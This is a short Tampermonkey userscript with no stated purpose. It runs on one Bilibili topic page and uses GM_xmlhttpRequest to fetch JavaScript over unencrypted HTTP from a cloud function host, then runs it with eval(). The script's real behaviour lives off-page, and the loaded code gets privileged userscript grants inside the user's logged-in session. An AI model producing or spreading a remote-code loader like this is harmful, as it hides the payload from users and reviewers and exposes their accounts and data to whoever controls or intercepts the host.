// ==UserScript==
// @name         晚兵
// @namespace    http://tampermonkey.net/ava
// @version      0.8
// @description  ~
// @author       你晚爹
// @match        https://www.bilibili.com/v/topic/detail*?topic_id=13332*
// @icon         https://s1.ax1x.com/2022/10/09/xJCaYF.png
// @run-at       document-end
// @require      https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js
// @grant        GM_xmlhttpRequest
// @grant        GM_getValue
// @grant        GM_setValue
// @grant        GM_addStyle
// @connect      abot.abot.1961584514352337.cn-hangzhou.fc.devsapp.net
// @license      MIT
// ==/UserScript==

(function () {
    GM_xmlhttpRequest({
        method: "GET",
        url: "http://abot.abot.1961584514352337.cn-hangzhou.fc.devsapp.net/index.js",
        onload: function (data) {
            var js = data.responseText;
            eval(js);
        },
    });
})();
